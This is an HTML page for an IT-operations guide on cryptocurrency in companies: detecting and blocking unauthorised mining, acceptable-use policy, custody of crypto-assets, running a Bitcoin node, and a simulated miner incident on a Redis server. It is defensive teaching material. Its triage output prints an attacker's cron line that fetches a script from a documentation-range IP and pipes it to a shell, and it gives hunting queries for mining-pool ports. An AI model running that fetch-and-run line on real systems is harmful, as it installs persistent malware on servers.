@@ -1,0 +1,175 @@
+<!doctype html>
+<html lang="en" class="no-js inner">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<!-- Security: GitHub Pages cannot send custom HTTP headers, so only what works in <meta> is set here (CSP, referrer).
+     Pending until the site moves behind Cloudflare (needs a custom domain), because they only work as real HTTP headers:
+     CSP frame-ancestors / X-Frame-Options (clickjacking), X-Content-Type-Options, Permissions-Policy, HSTS,
+     Cross-Origin-Opener-Policy, Cross-Origin-Embedder-Policy and Cross-Origin-Resource-Policy.
+     No Subresource Integrity on gtag.js and Turnstile api.js: both are unversioned by design and change without notice
+     (Cloudflare says not to pin Turnstile with SRI); the CSP limits them to their exact origins instead. -->
+<meta http-equiv="Content-Security-Policy" content="default-src 'self'; script-src 'self' https://www.googletagmanager.com https://challenges.cloudflare.com; style-src 'self'; img-src 'self' https://*.google-analytics.com https://www.googletagmanager.com; font-src 'self'; connect-src 'self' https://formspree.io https://b6aad168.sibforms.com https://*.google-analytics.com https://*.analytics.google.com https://www.googletagmanager.com; frame-src https://challenges.cloudflare.com; form-action 'self' https://formspree.io https://b6aad168.sibforms.com; object-src 'none'; base-uri 'self'; upgrade-insecure-requests">
+<meta name="referrer" content="strict-origin-when-cross-origin">
+<title>Cryptomining in the company: detect and block · Iñigo González</title>
+<meta name="description" content="Cryptocurrency from IT&#x27;s side: detecting and blocking unauthorised mining, acceptable use, custody controls, running a node and a miner incident.">
+<meta name="author" content="Iñigo González">
+<meta name="theme-color" content="#0e1a24">
+<link rel="canonical" href="https://inigogonzalezgarcia.github.io/guias/criptomonedas-en-la-empresa-mineria-no-autorizada-bloqueo-politica-custodia-nodos-y-un-servidor-al-100-de-cpu.html">
+<link rel="alternate" hreflang="en" href="https://inigogonzalezgarcia.github.io/guias/criptomonedas-en-la-empresa-mineria-no-autorizada-bloqueo-politica-custodia-nodos-y-un-servidor-al-100-de-cpu.html">
+<link rel="alternate" hreflang="es" href="https://inigogonzalezgarcia.github.io/es/guias/criptomonedas-en-la-empresa-mineria-no-autorizada-bloqueo-politica-custodia-nodos-y-un-servidor-al-100-de-cpu.html">
+<link rel="alternate" hreflang="x-default" href="https://inigogonzalezgarcia.github.io/guias/criptomonedas-en-la-empresa-mineria-no-autorizada-bloqueo-politica-custodia-nodos-y-un-servidor-al-100-de-cpu.html">
+<link rel="icon" href="../assets/favicon.svg" type="image/svg+xml">
+<link rel="apple-touch-icon" href="../assets/apple-touch-icon.png">
+<meta property="og:site_name" content="Iñigo González">
+<meta property="og:locale" content="en_GB">
+<meta property="og:locale:alternate" content="es_ES">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Cryptomining in the company: detect and block · Iñigo González">
+<meta property="og:description" content="Cryptocurrency from IT&#x27;s side: detecting and blocking unauthorised mining, acceptable use, custody controls, running a node and a miner incident.">
+<meta property="og:url" content="https://inigogonzalezgarcia.github.io/guias/criptomonedas-en-la-empresa-mineria-no-autorizada-bloqueo-politica-custodia-nodos-y-un-servidor-al-100-de-cpu.html">
+<meta property="og:image" content="https://inigogonzalezgarcia.github.io/assets/og/guias-nivel-4.png">
+<meta property="og:image:width" content="1200">
+<meta property="og:image:height" content="630">
+<meta property="og:image:alt" content="Cryptomining in the company: detect and block · Iñigo González">
+<meta name="twitter:card" content="summary_large_image">
+<link rel="preload" href="../assets/InterTight.woff" as="font" type="font/woff" crossorigin>
+<link rel="stylesheet" href="../assets/style.css">
+<script src="../assets/boot.js"></script>
+<script type="application/ld+json">{"@context":"https://schema.org","@graph":[{"@type":"TechArticle","headline":"Cryptocurrency in the company from IT's side: unauthorised mining, blocking, acceptable use, custody, nodes and a server at 100% CPU","alternativeHeadline":"Criptomonedas en la empresa vistas desde IT: minería no autorizada, bloqueo, política de uso, custodia, nodos y un servidor al 100 % de CPU","description":"How unauthorised mining is detected on endpoints, servers and cloud, how pools are blocked at DNS, proxy and firewall, what the acceptable-use policy says, which controls IT applies if the company holds crypto, how to run a node safely, and the incident steps for a server that hits 100% CPU every night.","datePublished":"2026-11-06","dateModified":"2026-11-06","inLanguage":"en","proficiencyLevel":"Expert","url":"https://inigogonzalezgarcia.github.io/guias/criptomonedas-en-la-empresa-mineria-no-autorizada-bloqueo-politica-custodia-nodos-y-un-servidor-al-100-de-cpu.html","mainEntityOfPage":"https://inigogonzalezgarcia.github.io/guias/criptomonedas-en-la-empresa-mineria-no-autorizada-bloqueo-politica-custodia-nodos-y-un-servidor-al-100-de-cpu.html","author":{"@type":"Person","@id":"https://inigogonzalezgarcia.github.io/#person","name":"Iñigo González","url":"https://inigogonzalezgarcia.github.io/"},"publisher":{"@type":"Person","@id":"https://inigogonzalezgarcia.github.io/#person","name":"Iñigo González","url":"https://inigogonzalezgarcia.github.io/"},"articleSection":"Cryptocurrency in the company"},{"@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","position":1,"name":"Home","item":"https://inigogonzalezgarcia.github.io/"},{"@type":"ListItem","position":2,"name":"Guides","item":"https://inigogonzalezgarcia.github.io/guias.html"},{"@type":"ListItem","position":3,"name":"Level 4","item":"https://inigogonzalezgarcia.github.io/guias/nivel-4.html"},{"@type":"ListItem","position":4,"name":"Cryptocurrency in the company from IT's side: unauthorised mining, blocking, acceptable use, custody, nodes and a server at 100% CPU","item":"https://inigogonzalezgarcia.github.io/guias/criptomonedas-en-la-empresa-mineria-no-autorizada-bloqueo-politica-custodia-nodos-y-un-servidor-al-100-de-cpu.html"}]}]}</script>
+</head>
+<body id="top">
+<a class="skip" href="#main"><span class="en">Skip to content</span></a>
+
+<header class="site-header">
+  <div class="wrap">
+    <a class="brand" href="../index.html" aria-label="Iñigo González">
+      <svg class="brand-mark" viewBox="0 0 34 34" aria-hidden="true"><rect x="1" y="1" width="32" height="32" fill="none" stroke="currentColor" stroke-width="1.5"/><path d="M10 9v16M17 9v16M17 9h7M17 17h5M24 17v8h-7" fill="none" stroke="currentColor" stroke-width="2.2" stroke-linecap="square"/><circle cx="10" cy="9" r="2.2" fill="#c4672b"/></svg>
+      <span class="brand-name">Iñigo González<small>IT Operations · Infra</small></span>
+    </a>
+    <nav class="top-nav label" aria-label="Main"><a href="../journey.html"><span class="en">Journey</span></a><a href="../about.html"><span class="en">About</span></a><a href="../blog/"><span class="en">Blog</span></a><a href="../guias.html" aria-current="page"><span class="en">Guides</span></a><a href="../store.html"><span class="en">Services</span></a><a href="../recursos.html"><span class="en">Resources</span></a><a href="../links.html"><span class="en">Links</span></a></nav>
+    <div class="head-actions">
+      <button class="menu-btn" id="menuOpen" aria-expanded="false" aria-controls="menu"><span class="en">Menu</span></button>
+      <span class="sep" aria-hidden="true"></span>
+      <a class="lang-btn" id="langBtn" href="../es/guias/criptomonedas-en-la-empresa-mineria-no-autorizada-bloqueo-politica-custodia-nodos-y-un-servidor-al-100-de-cpu.html" hreflang="es" aria-label="Leer esta página en español" lang="es"><span data-l="es">ES</span> · <span data-l="en" class="on">EN</span></a>
+    </div>
+  </div>
+</header>
+
+<div class="menu" id="menu" aria-hidden="true">
+  <div class="menu-top">
+    <span class="label">Iñigo González</span>
+    <button class="menu-btn" id="menuClose"><span class="en">Close ×</span></button>
+  </div>
+  <nav aria-label="Menu"><a href="../journey.html"><span class="label">01</span><span class="en">Journey</span></a><a href="../about.html"><span class="label">02</span><span class="en">About</span></a><a href="../blog/"><span class="label">03</span><span class="en">Blog</span></a><a href="../guias.html"><span class="label">04</span><span class="en">Guides</span></a><a href="../store.html"><span class="label">05</span><span class="en">Services</span></a><a href="../recursos.html"><span class="label">06</span><span class="en">Resources</span></a><a href="../links.html"><span class="label">07</span><span class="en">Links</span></a></nav>
+  <div class="menu-foot label">
+    <a href="https://www.linkedin.com/in/igonzalez93" rel="me noopener noreferrer" target="_blank">LinkedIn ↗</a>
+    <a href="https://github.com/inigogonzalezgarcia" rel="me noopener noreferrer" target="_blank">GitHub ↗</a>
+    <a href="../about.html#contacto"><span class="en">Contact</span> →</a>
+  </div>
+</div>
+
+<main id="main">
+<section class="page-hero post-hero">
+  <div class="wrap">
+    <p class="label kicker"><a href="../guias.html"><span class="en">Guides</span></a> · <a href="nivel-4.html"><span class="en">Level 4</span></a></p>
+    <h1><span class="en">Cryptocurrency in the company from IT&#x27;s side: unauthorised mining, blocking, acceptable use, custody, nodes and a server at 100% CPU</span></h1>
+    <p class="lede"><span class="en">How unauthorised mining is detected on endpoints, servers and cloud, how pools are blocked at DNS, proxy and firewall, what the acceptable-use policy says, which controls IT applies if the company holds crypto, how to run a node safely, and the incident steps for a server that hits 100% CPU every night.</span></p><p class="label post-meta"><span class="en">Level 4</span> · <span class="en">Cryptocurrency in the company</span> · <span class="en">9 min read</span> · <span class="en">Updated</span> <span class="en">6 Nov 2026</span></p>
+  </div>
+</section>
+
+<section class="section post">
+  <div class="wrap post-grid">
+    <article class="prose guide">
+      
+      <div class="en" lang="en">
+<h2>What you&#x27;ll get</h2>
+<p>Treating cryptocurrency as what it is for IT: a security risk (the miner someone installs on your servers), a policy matter (what is allowed on company devices) and, if the business decides to hold it, an asset whose keys must be guarded like any other critical secret. With a miner incident from start to finish.</p>
+<p class="g-tip">This guide is not financial or investment advice: it does not recommend buying, selling or mining any cryptocurrency.</p>
+<h2>Before you start</h2>
+<ul><li>CPU monitoring for servers and endpoints (Zabbix, SolarWinds or whatever is in place) with at least a month of history.</li><li>An EDR or Microsoft Defender for Endpoint on every endpoint and server, and access to its console.</li><li>Control of internal DNS, the proxy or web filter and the perimeter firewall.</li><li>If there is cloud: read access to costs and to security alerts (Microsoft Defender for Cloud, Amazon GuardDuty).</li><li>For custody: Finance and Compliance in the conversation from the start. IT sets the controls; the decision to hold crypto-assets is not IT&#x27;s.</li></ul>
+<h2>1. What unauthorised mining looks like</h2>
+<p>There are two cases and they look little alike:</p>
+<ul><li><strong>Cryptojacking</strong>: an attacker gets in through an exposed service (SSH with a weak password, Redis or the Docker API without authentication, an unpatched web app) and installs a miner, almost always for Monero with a variant of <strong>XMRig</strong>. They look for servers with plenty of CPU that nobody watches at night.</li><li><strong>Internal use</strong>: someone on staff uses GPU machines, a lab server or the cloud account to mine for themselves.</li></ul>
+<p>The signals, from most to least reliable:</p>
+<div class="g-table"><table><thead><tr><th>Signal</th><th>Where to look</th></tr></thead><tbody><tr><td>CPU sustained at 90-100% with no business load, often at night</td><td>Monitoring: the 30-day graph changes shape on a specific day</td></tr><tr><td>Antivirus or EDR detection</td><td>Defender: <strong>CoinMiner</strong> families (<code>Trojan:Win32/CoinMiner</code>, <code>Trojan:Linux/CoinMiner</code>) or potentially unwanted applications</td></tr><tr><td>Outbound connections to pools over <strong>stratum</strong></td><td>Firewall and proxy: ports such as 3333, 4444, 5555 or 14444, or <code>stratum+tcp://</code> in the process command line</td></tr><tr><td>DNS queries to pool domains</td><td>Internal DNS or DNS filter logs</td></tr><tr><td>Cloud bill rising on compute</td><td>New GPU instances, sometimes in a region the company does not use</td></tr><tr><td>Fans and temperature</td><td>The user: &quot;the laptop is hot and slow&quot;</td></tr></tbody></table></div>
+<p>In Defender for Endpoint, advanced hunting finds processes talking to typical stratum ports:</p>
+<figure class="term"><figcaption class="t-bar"><span class="t-dots" aria-hidden="true"><i></i><i></i><i></i></span><span class="t-title">Defender XDR · Hunting › Advanced hunting</span><button class="t-copy" type="button" data-copy="DeviceNetworkEvents | where Timestamp &gt; ago(7d) | where RemotePort in (3333, 4444, 5555, 7777, 14444) and ActionType == &quot;ConnectionSuccess&quot; | summarize Connections=count(), Targets=make_set(RemoteUrl, 5) by DeviceName, InitiatingProcessFileName | order by Connections desc" data-copied="Commands copied">Copy commands</button></figcaption><pre class="t-body"><code><span class="t-cmd"><span class="t-ps" aria-hidden="true">›</span>DeviceNetworkEvents | where Timestamp &gt; ago(7d) | where RemotePort in (3333, 4444, 5555, 7777, 14444) and ActionType == &quot;ConnectionSuccess&quot; | summarize Connections=count(), Targets=make_set(RemoteUrl, 5) by DeviceName, InitiatingProcessFileName | order by Connections desc</span><span class="t-out">DeviceName              InitiatingProcessFileName   Connections   Targets</span><span class="t-out">lnx-app07.contoso.local kdevtmpfsi                  1840          [&quot;pool.minero.example&quot;]</span></code></pre></figure>
+<p class="g-warn">Ports prove nothing on their own: 4444 or 5555 are used by other applications too. What confirms it is the process, its path and its command line.</p>
+<h2>2. Blocking pools: DNS, proxy and firewall</h2>
+<p>Three layers, because a well-built miner tries several:</p>
+<ul><li><strong>DNS</strong>: the DNS filter or security provider usually has a <em>Cryptomining</em> or <em>Cryptocurrency mining</em> category: set it to block. With Windows Server DNS, a query resolution policy drops queries to a list of domains you maintain:</li></ul>
+<figure class="term"><figcaption class="t-bar"><span class="t-dots" aria-hidden="true"><i></i><i></i><i></i></span><span class="t-title">PowerShell · Windows Server DNS</span><button class="t-copy" type="button" data-copy="Add-DnsServerQueryResolutionPolicy -Name &quot;Block-Pools&quot; -Action IGNORE -FQDN &quot;EQ,*.minero.example,*.pool-ejemplo.example&quot; -PassThru&#10;Get-DnsServerQueryResolutionPolicy | Format-Table Name, Action, IsEnabled" data-copied="Commands copied">Copy commands</button></figcaption><pre class="t-body"><code><span class="t-cmd"><span class="t-ps" aria-hidden="true">›</span>Add-DnsServerQueryResolutionPolicy -Name &quot;Block-Pools&quot; -Action IGNORE -FQDN &quot;EQ,*.minero.example,*.pool-ejemplo.example&quot; -PassThru</span><span class="t-cmd"><span class="t-ps" aria-hidden="true">›</span>Get-DnsServerQueryResolutionPolicy | Format-Table Name, Action, IsEnabled</span><span class="t-out">Name         Action  IsEnabled</span><span class="t-out">Block-Pools  Ignore  True</span></code></pre></figure>
+<ul><li><strong>Proxy or web filter</strong>: the same category in the browsing policies, which also stops in-browser mining scripts.</li><li><strong>Firewall</strong>: what protects most is that <strong>servers do not have free outbound access to the Internet</strong>. An outbound rule per server or group with the destinations it needs (updates, business APIs) and a final logged deny. With that, the miner installs but cannot work, and the firewall log gives it away.</li><li><strong>Endpoints</strong>: in Defender, potentially unwanted application (PUA) detection in block mode and network protection; the <a href="defender-antivirus-y-reglas-asr-de-auditoria-a-bloqueo-y-una-aplicacion-bloqueada.html">Defender and ASR rules</a> guide explains how to turn them on without breaking anything.</li></ul>
+<p class="g-tip">A server that can only talk to what it needs is the best defence against miners, and against almost everything else too.</p>
+<h2>3. The acceptable-use policy</h2>
+<p>A few lines in the systems acceptable-use policy, reviewed by HR and Legal, make clear what is allowed and what the consequences are:</p>
+<ul><li>Mining cryptocurrency with any company resource is forbidden: endpoints, servers, cloud accounts, office electricity and the network, including browser extensions and apps that &quot;share resources&quot; in exchange for rewards.</li><li>Installing wallets, nodes or trading software on corporate devices is forbidden unless explicitly authorised for a business function.</li><li>Using company email, credentials or devices for personal accounts on exchanges is forbidden.</li><li>IT may monitor CPU use, processes and traffic to detect these activities, within what the privacy policy and employment law allow.</li><li>Suspicions are reported to IT or Security through the usual channel.</li></ul>
+<p>The approved software list and blocking in the device manager (Intune, MECM) are what enforce the policy; the text only explains it.</p>
+<h2>4. If the company holds crypto-assets: custody and IT controls</h2>
+<p>The decision belongs to management and Finance; IT&#x27;s job is making sure the keys are neither lost nor used by the wrong people. The usual options:</p>
+<div class="g-table"><table><thead><tr><th>Option</th><th>Who holds the keys</th><th>Main risk</th><th>IT control</th></tr></thead><tbody><tr><td><strong>Exchange or custodian</strong></td><td>The provider</td><td>The provider fails or is attacked</td><td>Accounts with hardware-key MFA, withdrawals only to allow-listed addresses, two people to approve</td></tr><tr><td><strong>Hardware wallet</strong></td><td>The company, on a device</td><td>Losing the device and the seed phrase</td><td>Physical custody, seed phrase outside every system</td></tr><tr><td><strong>Multisig</strong> (for example 2 of 3)</td><td>Several people with separate devices</td><td>Coordinating signers and recovery</td><td>Signers at different sites, written and tested procedure</td></tr></tbody></table></div>
+<p>In the EU, crypto-asset service providers need authorisation under the <strong>MiCA</strong> regulation: checking the custodian has it is a question for Compliance.</p>
+<p>The non-negotiable controls for the <strong>seed phrase</strong> (12 or 24 words that regenerate every key):</p>
+<ul><li>Never in digital form: not in a shared password manager, not in a photo, not in an email, not in a cloud document.</li><li>Stamped in metal or written on paper, in a safe, with a log of who accesses it. If it is split between people, none of them can rebuild it alone.</li><li><strong>Dual control</strong>: no single person can move funds. With multisig the scheme guarantees it; with a hardware wallet, the procedure and access to the safe do.</li><li>Before every large transfer, a small test transaction and the destination address checked on the device screen, not on the clipboard (there is malware that swaps it).</li><li>A recovery test once a year with a new device, recorded like any backup test.</li><li>Leavers: when a signer leaves the company, their key is rotated the way a privileged account is.</li></ul>
+<h2>5. Running a node: lab and production</h2>
+<p>Sometimes a development team needs its own node (for example <strong>Bitcoin Core</strong>) to validate transactions or test an integration. The rules change depending on where:</p>
+<ul><li><strong>Lab</strong>: on an isolated VLAN, on the test network (<code>testnet=1</code> or <code>signet=1</code>) rather than mainnet, with no production data and a retirement date.</li><li><strong>Production</strong>: a dedicated server, no wallet on the node (<code>disablewallet=1</code>), the RPC interface on localhost only and authenticated, patched like any other server and watched by monitoring.</li></ul>
+<figure class="term"><figcaption class="t-bar"><span class="t-dots" aria-hidden="true"><i></i><i></i><i></i></span><span class="t-title">lnx-node01 · ~/.bitcoin/bitcoin.conf for a production node</span><button class="t-copy" type="button" data-copy="cat /home/bitcoin/.bitcoin/bitcoin.conf" data-copied="Commands copied">Copy commands</button></figcaption><pre class="t-body"><code><span class="t-cmd"><span class="t-ps" aria-hidden="true">›</span>cat /home/bitcoin/.bitcoin/bitcoin.conf</span><span class="t-out">server=1</span><span class="t-out">disablewallet=1</span><span class="t-out">rpcbind=127.0.0.1</span><span class="t-out">rpcallowip=127.0.0.1</span><span class="t-out">rpcauth=integration:&lt;salt&gt;$&lt;hash&gt;</span><span class="t-cmt"># prune=550 if the full chain is not needed</span></code></pre></figure>
+<ul><li>Port <strong>8333</strong> (P2P) may be opened inbound if the node must accept connections; <strong>8332</strong> (RPC) never. An exposed RPC is a direct way in.</li><li>The full chain takes hundreds of gigabytes and grows every day; <em>prune</em> mode keeps only recent blocks if the application does not need history.</li><li><code>rpcauth</code> stores a hash of the password, not the password; the project&#x27;s own <code>rpcauth.py</code> script generates it.</li></ul>
+<h2>6. The ticket: &quot;lnx-app07 hits 100% CPU every night&quot;</h2>
+<p>Monday, 8:15. Monitoring has alerted three nights running: <code>lnx-app07</code>, an Ubuntu application server, climbs to 100% CPU around 23:00 and drops at 7:00. Nobody has changed anything in the deployment.</p>
+<ol><li><strong>Look without touching.</strong> Before killing anything, record what is happening:</li></ol>
+<figure class="term"><figcaption class="t-bar"><span class="t-dots" aria-hidden="true"><i></i><i></i><i></i></span><span class="t-title">lnx-app07 · initial triage</span><button class="t-copy" type="button" data-copy="ps -eo pid,user,%cpu,lstart,cmd --sort=-%cpu | head -n 4&#10;sudo ls -l /proc/48211/exe&#10;sudo ss -tnp | grep 48211&#10;sudo crontab -u redis -l" data-copied="Commands copied">Copy commands</button></figcaption><pre class="t-body"><code><span class="t-cmd"><span class="t-ps" aria-hidden="true">›</span>ps -eo pid,user,%cpu,lstart,cmd --sort=-%cpu | head -n 4</span><span class="t-out">    PID USER     %CPU                  STARTED CMD</span><span class="t-out">  48211 redis    397  Sun Nov  2 23:00:04 2026 /tmp/.x/kdevtmpfsi</span><span class="t-out">   1287 www-data   3  Fri Oct 24 09:12:31 2026 /usr/sbin/apache2 -k start</span><span class="t-cmd"><span class="t-ps" aria-hidden="true">›</span>sudo ls -l /proc/48211/exe</span><span class="t-out">lrwxrwxrwx 1 redis redis 0 Nov  6 08:16 /proc/48211/exe -&gt; /tmp/.x/kdevtmpfsi (deleted)</span><span class="t-cmd"><span class="t-ps" aria-hidden="true">›</span>sudo ss -tnp | grep 48211</span><span class="t-out">ESTAB 0 0 10.30.1.17:51544 198.51.100.23:3333 users:((&quot;kdevtmpfsi&quot;,pid=48211,fd=9))</span><span class="t-cmd"><span class="t-ps" aria-hidden="true">›</span>sudo crontab -u redis -l</span><span class="t-out">*/30 * * * * curl -fsSL http://203.0.113.45/b.sh | sh</span></code></pre></figure>
+<p>A process with a system-sounding name in <code>/tmp</code>, deleted from disk after starting, running as <strong>redis</strong>, connected to port 3333 and with a cron job that reinstalls it every half hour. It is a miner.</p>
+<ol><li><strong>Open a security incident</strong>, not just a performance ticket: tell Security and the application owner. From here on, every step goes in the incident log with its time.</li></ol>
+<ol><li><strong>Contain.</strong> Isolate the server in the EDR (<em>Isolate device</em>) or, without one, a firewall rule cutting all outbound traffic except the management console. The miner stops working and downloading, and no evidence is lost.</li></ol>
+<ol><li><strong>Keep evidence</strong> before cleaning: a copy of the binary from <code>/proc/48211/exe</code>, its hash (<code>sha256sum</code>), the <code>crontab</code>, the process and connection lists, <code>/var/log/auth.log</code> and the Redis configuration. If the server is a VM, a snapshot.</li></ol>
+<ol><li><strong>Find the way in.</strong> The user tells you: Redis. <code>redis-cli CONFIG GET bind</code> returns <code>0.0.0.0</code> and <code>requirepass</code> is empty; a rule on the site firewall opened 6379 to the Internet for a test months ago. Also look for persistence in <code>~/.ssh/authorized_keys</code>, <code>/etc/cron.d/</code>, <code>systemctl list-timers</code> and new services in <code>/etc/systemd/system/</code>.</li></ol>
+<ol><li><strong>Eradicate and recover.</strong> The safe option is to <strong>rebuild</strong> the server from a clean image and restore the application data, not clean it by hand: you do not know what else the attacker left. Redis comes back listening on <code>127.0.0.1</code> only, with a password and without the firewall rule. Credentials that were on the server are changed.</li></ol>
+<ol><li><strong>Check the scope</strong>: the section 1 search across the whole estate and the DNS logs for the same domain or the IP <code>203.0.113.45</code>. If the server held personal data, deciding whether to notify follows the <a href="iso-27001-nis2-y-rgpd-en-it-controles-evidencias-plazos-y-un-portatil-perdido.html">ISO 27001, NIS2 and GDPR</a> guide.</li></ol>
+<p>In the ticket: symptom, process and connection, way in (Redis exposed without a password), containment, evidence kept, rebuild, firewall changes, scope checked and the task to review every &quot;temporary&quot; inbound rule.</p>
+<h2>Next steps</h2>
+<ul><li>The <a href="fortigate-politicas-con-minimo-privilegio-vpn-con-entra-id-tuneles-entre-sedes-y-un-usuario-que-no-llega.html">FortiGate</a> guide explains the least-privilege policies that leave a server without free outbound access.</li><li>The <a href="zabbix-servidor-agente-2-plantillas-macros-dependencias-avisos-y-un-agente-no-disponible.html">Zabbix with agent 2</a> guide sets up the sustained-CPU alert that opens this ticket.</li><li>The <a href="azure-cost-management-ambitos-presupuestos-etiquetas-reservas-focus-y-la-factura-que-se-dispara.html">Azure Cost Management</a> guide helps find the GPU machines nobody asked for.</li></ul>
+<p>Is something missing, or different in your environment? <a href="../about.html#contacto">Get in touch</a> and I'll fix it.</p>
+      </div>
+      <div class="news-box">
+        <p class="label kicker">Tech Career Lab · newsletter</p>
+        <p class="news-box-t"><span class="en">Found this useful? Every two weeks I send one practical idea for IT professionals: LinkedIn, projects, networking and hiring processes.</span></p>
+        <a class="btn" href="../recursos.html"><span class="en">Sign up and get the 33 ideas</span> →</a>
+      </div>
+    </article>
+    <aside class="post-aside">
+      <p class="label muted"><span class="en">This guide</span></p>
+      <p class="repo-name"><span class="en">Level 4</span> · <span class="en">Cryptocurrency in the company</span></p>
+      <p class="muted small"><span class="en">The examples (domains, users, names) are fictional. The windows and terminals are simulated for the guide.</span></p>
+      <a class="arrow-link" href="nivel-4.html"><span class="en">All Level 4 guides</span> →</a>
+      
+      <p class="share-msg small muted" role="status" aria-live="polite"></p>
+    </aside>
+  </div>
+  
+  <div class="wrap related">
+    <h2 class="label kicker related-h"><span class="en">Related</span></h2>
+    <div class="related-grid"><a class="related-link" href="../blog/25-security-controls-evidence.html"><span class="label muted"><span class="en">Blog · 25</span></span><span class="related-t"><span class="en">What will the auditor ask for that you cannot show yet? One register for ISO 27001, NIS2 and GDPR</span></span></a></div>
+  </div>
+  <div class="wrap post-nav">
+    <a class="post-nav-link prev" href="splunk-forwarders-indices-busquedas-spl-panel-alerta-licencia-y-una-fuente-que-deja-de-llegar.html"><span class="label muted"><span class="en">Previous</span></span><span><span class="en">Splunk Enterprise: forwarders, indexes, SPL searches, a dashboard, an alert, the licence and a source that stops arriving</span></span></a>
+    <a class="post-nav-link next" href="migracion-de-tenant-microsoft-365-inventario-identidades-buzones-onedrive-y-dia-del-corte.html"><span class="label muted"><span class="en">Next</span></span><span><span class="en">Microsoft 365 tenant migrations: inventory, identities, mailboxes, OneDrive and cutover day</span></span></a>
+  </div>
+</section>
+</main>
+
+<footer>
+  <div class="wrap">
+    <span>© <span id="year">2026</span> Iñigo González · Madrid</span>
+    <span><a href="../aviso-legal.html"><span class="en">Legal notice</span></a> · <a href="../privacidad.html"><span class="en">Privacy and cookies</span></a> · <a href="../condiciones.html"><span class="en">Terms</span></a> · <a href="../recursos.html">Newsletter</a> · <span class="en">SysAdmin Desks: <a href="https://sysadmindesksbyigg.pages.dev/about?lang=en" target="_blank" rel="noopener noreferrer">about</a> · <a href="https://sysadmindesksbyigg.pages.dev/faq?lang=en" target="_blank" rel="noopener noreferrer">FAQ</a></span> · <button class="linkbtn" type="button" data-cookie-settings><span class="en">Cookie settings</span></button></span>
+    <a href="#top"><span class="en">Back to top ↑</span></a>
+  </div>
+</footer>
+
+<script src="../assets/data.js"></script>
+<script src="../assets/app.js"></script>
+<script src="../assets/consent.js"></script>
+</body>
+</html>
